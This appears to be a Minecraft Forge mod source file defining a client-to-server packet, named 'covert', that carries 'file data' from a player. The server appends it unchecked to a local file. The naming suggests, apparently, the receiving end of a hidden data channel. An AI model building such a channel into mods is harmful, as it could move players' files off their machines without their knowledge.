package com.example.covertmod.networking.packet;

import com.mojang.logging.LogUtils;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.minecraftforge.event.network.CustomPayloadEvent;
import org.slf4j.Logger;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

public class CovertDataC2SPacket {
    private final String fileData;
    private static final Logger LOGGER = LogUtils.getLogger();

    public CovertDataC2SPacket(String fileData) {
        this.fileData = fileData;
    }

    public CovertDataC2SPacket(FriendlyByteBuf buf) {
        this.fileData = buf.readUtf(32767);
    }

    public void toBytes(FriendlyByteBuf buf) {
        buf.writeUtf(this.fileData);
    }

    public void handle(CustomPayloadEvent.Context context) {
        context.enqueueWork(() -> {
            ServerPlayer player = context.getSender();
            if (player != null) {
                player.sendSystemMessage(Component.translatable("Bytes read: " + this.fileData.length()));
                writeFileData(this.fileData);
            }
        });
    }

    private void writeFileData(String data) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter("server-side-file.txt", true))) {
            writer.write(data);
            LOGGER.info("Wrote {} bytes to file", data.length());
        } catch (IOException e) {
            LOGGER.error("Error writing data to file: {}", e.getMessage());
        }
    }
}